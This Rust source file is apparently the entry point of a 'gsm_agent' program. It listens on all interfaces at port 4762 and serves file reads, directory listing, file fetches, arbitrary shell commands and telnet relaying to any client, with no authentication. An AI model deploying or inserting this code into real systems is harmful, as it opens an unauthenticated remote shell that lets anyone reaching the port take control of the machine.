use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

use gsm_agent::ThreadPool;

mod command;

fn main() {
    let listener = TcpListener::bind("0.0.0.0:4762").unwrap();
    let pool = ThreadPool::new(4);
    for stream in listener.incoming() {
        match stream {
            Ok(s) => pool.execute(|| {
                handle_connection(s);
            }),
            Err(e) => println!("invalid stream: {:?}\n", e),
        }
    }
}

fn handle_connection(mut stream: TcpStream) {
    loop {
        let mut buffer = [0; 1024];
        stream
            .read(&mut buffer)
            .expect("Failed to read from socket");
        let mut request: &str =
            &String::from_utf8(buffer.to_vec()).expect("Failed to convert command to string");
        request = request.trim();
        let trim_chars = [' ', '\r', '\n', '\0'];
        request = request.trim_matches(&trim_chars[..]);
        let mut command_iter = request.split_whitespace();
        match command_iter.next() {
            Some(command) => {
                let response: String = match command {
                    "cat" => command::cat(command_iter.next().unwrap()),
                    "cd" => match command::cd(&request[3..]) {
                        Ok(s) => s.to_string(),
                        Err(e) => e.to_string(),
                    },
                    "get" => {
                        match command::get(
                            command_iter.next().unwrap(),
                            command_iter.next().unwrap(),
                        ) {
                            Ok(_) => String::new(),
                            Err(e) => (*e).to_string(),
                        }
                    }
                    "ls" => {
                        let path = match command_iter.next() {
                            Some(s) => s.to_string(),
                            None => command::pwd(),
                        };
                        command::ls(path.as_ref())
                    }
                    "ping" => String::from("pong"),
                    "pwd" => command::pwd(),
                    "shell" => command::shell(command_iter.next().unwrap(), command_iter),
                    "telnet" => {
                        let host = command_iter.next().unwrap();
                        let port = u16::from_str_radix(command_iter.next().unwrap(), 10).unwrap();
                        match command::telnet(&mut stream, host, &port) {
                            Ok(s) => s,
                            Err(e) => e.to_string(),
                        }
                    }
                    _ => {
                        format!(
                            "unknown command: {:?}",
                            request.split_whitespace().next().unwrap_or("")
                        )
                    }
                };
                stream.write(format!("{}\n", response).as_bytes()).unwrap();
                stream.flush().unwrap();
            }
            None => {
                return;
            }
        }
    }
}
